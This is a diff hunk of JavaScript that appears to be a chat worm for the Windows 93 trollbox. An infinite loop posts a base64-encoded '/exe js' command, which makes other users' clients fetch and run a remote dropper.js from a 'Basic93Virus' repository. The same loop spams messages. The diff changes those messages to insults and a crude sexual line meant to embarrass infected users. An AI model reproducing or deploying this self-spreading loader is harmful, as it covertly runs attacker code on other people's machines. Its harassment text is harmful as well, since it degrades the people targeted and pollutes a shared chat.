@@ -16,13 +16,13 @@ function send_text(msg) {
 }
 
 async function lets_do_this() {
-	console.log('lol you are a nerd.')
+	console.log('Loser')
 	$exe('trollbox')
 	await sleep(500)
 	while (true) {
 	send_text('/exe js data:application/javascript;base64,JGxvYWRlcihbJ2h0dHBzOi8vZ2hjZG4ucmF3Z2l0Lm9yZy9PdXRSaXRlL0Jhc2ljOTNWaXJ1cy9tYWluL2Ryb3BwZXIuanMnXSwgJG5vb3ApOw=')
 	await sleep(100)
-	send_text('I AM A REDDITOR LOL')
+	send_text('I love Gay Porn!')
 	await sleep(100)
 }	
 }
